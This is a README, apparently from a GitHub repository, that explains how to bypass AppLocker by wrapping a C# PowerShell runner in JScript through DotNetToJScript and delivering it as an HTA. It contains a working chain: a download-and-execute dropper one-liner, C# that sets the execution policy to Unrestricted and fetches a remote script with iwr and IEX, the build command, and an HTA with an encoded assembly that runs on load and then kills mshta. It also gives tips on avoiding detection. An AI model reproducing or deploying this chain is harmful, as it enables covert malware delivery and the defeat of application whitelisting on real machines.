# AppLocker-Bypass
Bypassing AppLocker (executing Powershell scripts/commands) with C#

### NEW METHOD

There is a way to execute C# code in VBScript / JScript, which we can implement in an HTA, thanks to [DotNetToJscript](https://github.com/tyranid/DotNetToJScript).

The binary is on my github, if you don't want to build it yourself.

Say you want to use this one-liner dropper :

`powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|IEX"`  
  
You need to make the C# code and build it as a DLL:

```C#
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
    
namespace PshScriptExecLibrary {
  [ComVisible(true)]
       public class RunScriptClass {
           public RunScriptClass() {
               // By default, ExecutionPolicy is Restricted, let's change that
               Runspace r = RunspaceFactory.CreateRunspace();
               r.Open();
               RunspaceInvoke s = new RunspaceInvoke(r);
               s.Invoke("Set-ExecutionPolicy Unrestricted -Scope CurrentUser");
               s.Invoke("(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<webserver>/<path_to_script>.ps1')|IEX");
               r.Close();
           }
    
           public void RunProcess(string path) {
               Process.Start(path);
           }
     }
}
```

Then, you use DotNetToJscript to construct the VBS/JSript file.

`DotNetToJScript.exe PshScriptExecLibrary.dll -v auto -c PshScriptExecLibrary.RunScriptClass -l jscript -o scriptExec.js`

(Pick JScript instead of VBA/VBS, they are always flagged for some reason)

Parameters :

\-v auto is to specify to the program that the assembly targets higher versions (powershell libraries are not available for assemblies in the default version (v2))

\-c is used to specify the class (in this case PshScriptExecLibrary.RunScriptClass).

By default DotNetToJScript uses its TestClass so that's why you have to specify which class to use  

\-l is used to specify the type of script we want to generate, here JScript  

\-o is the path/name to/of the output file

Then we create our HTA containing the generated JS code:

```html
    <html>
    
    <head>
    
    <script language="JScript">
    function setversion() {
    var shell = new ActiveXObject('WScript.Shell');
    ver = 'v4.0.30319';
    try {
    shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
    } catch(e) { 
    ver = 'v2.0.50727';
    }
    shell.Environment('Process')('COMPLUS_Version') = ver;
    
    }
    function debug(s) {}
    function base64ToStream(b) {
    	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
    	var length = enc.GetByteCount_2(b);
    	var ba = enc.GetBytes_4(b);
    	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    	ba = transform.TransformFinalBlock(ba, 0, length);
    	var ms = new ActiveXObject("System.IO.MemoryStream");
    	ms.Write(ba, 0, (length / 4) * 3);
    	ms.Position = 0;
    	return ms;
    }
    
    var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
    "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
    "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
    "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
    "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
    "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
    "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
    "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
    "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
    "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
    "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
    "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
    "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
    "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
    "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
    "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
    "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
    "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
    "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
    "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
    "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
    "ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
    "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAtrRrrAAAAAAA"+
    "AAAA4AAiIAsBMAAADAAAAAYAAAAAAABKKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAYA"+
    "AAAAAAAAAIAAAAACAAAAAAAAAwBghQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA9ykA"+
    "AE8AAAAAQAAA2AMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAADwpAAA4AAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
    "AAAALnRleHQAAABQCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA2AMAAABA"+
    "AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"+
    "AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAACsqAAAAAAAASAAAAAIABQCkIAAAmAgAAAEAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzACADwAAAAB"+
    "AAARAigPAAAKAAAoEAAACgoGbxEAAAoABnMSAAAKCwdyAQAAcG8TAAAKJgdyaQAAcG8TAAAKJgZv"+
    "FAAACgAqJgADKBUAAAomKgAAQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAAPAIA"+
    "ACN+AACoAgAAGAMAACNTdHJpbmdzAAAAAMAFAACEAQAAI1VTAEQHAAAQAAAAI0dVSUQAAABUBwAA"+
    "RAEAACNCbG9iAAAAAAAAAAIAAAFHFQIACQAAAAD6ATMAFgAAAQAAABYAAAACAAAAAgAAAAEAAAAV"+
    "AAAADwAAAAEAAAABAAAAAwAAAAAA5wEBAAAAAAAGAB4BmgIGAIsBmgIGAFIAQQIPALoCAAAGAHoA"+
    "KQIGAAEBKQIGAOIAKQIGAHIBKQIGAD4BKQIGAFcBKQIGAJEAKQIGAGYAewIGAEQAewIGAMUAKQIG"+
    "AKwAqQEGAOUCAAIKACYAVAIKAC8ADAIKAAcDVAIGAAEAyAEKAOMCDAIOANsCQQIAAAAADgAAAAAA"+
    "AQABAAEAEADJAvICQQABAAEAUCAAAAAAhhg7AgYAAQCYIAAAAACGANgCEAABAAAAAQDDAQkAOwIB"+
    "ABEAOwIGABkAOwIKACkAOwIQADEAOwIQADkAOwIQAEEAOwIQAEkAOwIQAFEAOwIQAFkAOwIQAGEA"+
    "OwIVAGkAOwIQAHEAOwIQAHkAOwIQAIEAOwIGAJkAIAAhAIkABwIGAJEAOwImAJEANwAsAIkAPgAG"+
    "ALEA7AI2AC4ACwBOAC4AEwBXAC4AGwB2AC4AIwB/AC4AKwCZAC4AMwCZAC4AOwCZAC4AQwB/AC4A"+
    "SwCfAC4AUwCZAC4AWwCZAC4AYwC3AC4AawDhAC4AcwDuAEMAWwA8ARoABIAAAAEAAAAAAAAAAAAA"+
    "AAAA8gIAAAQAAAAAAAAAAAAAADwAFwAAAAAAAwAAAAAAAAAAAAAARQAMAgAAAAAEAAAAAAAAAAAA"+
    "AAA8AAACAAAAAAAAAAAAQ29sbGVjdGlvbmAxADxNb2R1bGU+AG1zY29ybGliAENyZWF0ZVJ1bnNw"+
    "YWNlAFJ1bnNwYWNlSW52b2tlAENsb3NlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0"+
    "ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFk"+
    "ZW1hcmtBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNp"+
    "b25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3Jp"+
    "cHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVBy"+
    "b2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55"+
    "QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLlZl"+
    "cnNpb25pbmcAcGF0aABTeXN0ZW0uQ29sbGVjdGlvbnMuT2JqZWN0TW9kZWwAUHNoU2NyaXB0RXhl"+
    "Y0xpYnJhcnkuZGxsAFN5c3RlbQBPcGVuAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24AU3lz"+
    "dGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5NYW5hZ2VtZW50"+
    "LkF1dG9tYXRpb24uUnVuc3BhY2VzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0"+
    "ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFJ1blNjcmlwdENsYXNz"+
    "AFJ1blByb2Nlc3MAUFNPYmplY3QAU3RhcnQAUHNoU2NyaXB0RXhlY0xpYnJhcnkAUnVuc3BhY2VG"+
    "YWN0b3J5AAAAZ1MAZQB0AC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABVAG4AcgBl"+
    "AHMAdAByAGkAYwB0AGUAZAAgAC0AUwBjAG8AcABlACAAQwB1AHIAcgBlAG4AdABVAHMAZQByAAGB"+
    "FygATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAFAA"+
    "cgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0"+
    "AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUA"+
    "ZABlAG4AdABpAGEAbABzADsAaQB3AHIAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAw"+
    "AC4ANQAvAG4AbwB0AGgAaQBuAGcAdwByAG8AbgBnAC4AcABzADEAJwApAHwASQBFAFgAAQAAKm/M"+
    "oh9hm02A6WvKderalQAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBgcCEkUSSQQAABJFBSABARJF"+
    "CSABFRJRARJVDgUAARJZDgi3elxWGTTgiQgxvzhWrTZONQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5v"+
    "bkV4Y2VwdGlvblRocm93cwEIAQAHAQAAAAAZAQAUUHNoU2NyaXB0RXhlY0xpYnJhcnkAAAUBAAAA"+
    "ABcBABJDb3B5cmlnaHQgwqkgIDIwMjEAACkBACRjMjg4ZDlkZC0wMDcxLTQzMjMtOGRjNi0zNDhl"+
    "Y2VlYmFlYmIAAAwBAAcxLjAuMC4wAABNAQAcLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjcuMgEA"+
    "VA4URnJhbWV3b3JrRGlzcGxheU5hbWUULk5FVCBGcmFtZXdvcmsgNC43LjIFAQABAAAAAAAAAABK"+
    "FGKsAAAAAAIAAACDAAAAdCkAAHQLAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAUlNEU4DU"+
    "2bj53nBElAstJDpCuCIBAAAAQzpcVXNlcnNcT2NjdWx0b1xzb3VyY2VccmVwb3NcUHNoU2NyaXB0"+
    "RXhlY0xpYnJhcnlcUHNoU2NyaXB0RXhlY0xpYnJhcnlcb2JqXERlYnVnXFBzaFNjcmlwdEV4ZWNM"+
    "aWJyYXJ5LnBkYgAfKgAAAAAAAAAAAAA5KgAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKyoAAAAA"+
    "AAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"+
    "AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAB8AwAAAAAAAAAAAAB8AzQAAABW"+
    "AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAA"+
    "PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"+
    "AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE3AIAAAEAUwB0AHIAaQBuAGcA"+
    "RgBpAGwAZQBJAG4AZgBvAAAAuAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBl"+
    "AG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAFIAFQABAEYA"+
    "aQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABQAHMAaABTAGMAcgBpAHAAdABFAHgAZQBj"+
    "AEwAaQBiAHIAYQByAHkAAAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAA"+
    "LgAwAC4AMAAAAFIAGQABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAUABzAGgAUwBjAHIAaQBw"+
    "AHQARQB4AGUAYwBMAGkAYgByAGEAcgB5AC4AZABsAGwAAAAAAEgAEgABAEwAZQBnAGEAbABDAG8A"+
    "cAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADIAMQAAACoAAQAB"+
    "AEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAWgAZAAEATwByAGkAZwBpAG4A"+
    "YQBsAEYAaQBsAGUAbgBhAG0AZQAAAFAAcwBoAFMAYwByAGkAcAB0AEUAeABlAGMATABpAGIAcgBh"+
    "AHIAeQAuAGQAbABsAAAAAABKABUAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAFAAcwBoAFMA"+
    "YwByAGkAcAB0AEUAeABlAGMATABpAGIAcgBhAHIAeQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABW"+
    "AGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYA"+
    "ZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAEw6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
    "AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"+
    "ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
    var entry_class = 'PshScriptExecLibrary.RunScriptClass';
    
    try {
    	setversion();
    	var stm = base64ToStream(serialized_obj);
    	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    	var al = new ActiveXObject('System.Collections.ArrayList');
    	var d = fmt.Deserialize_2(stm);
    	al.Add(undefined);
    	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
    	
    } catch (e) {
        debug(e.message);
    }
    </script>
    
    <!-- This is to close the HTA window, it's not very pretty but it works -->
    <script language="VBScript">
      
    Sub DeleteFile()
       Set shutDown = CreateObject("Wscript.Shell")
       shutDown.Run "taskkill /im mshta.exe /f", 0, false
    End Sub
    
    </script>
    
    
    </head>
    
    <body onload="DeleteFile()"></body>
    </html>
```
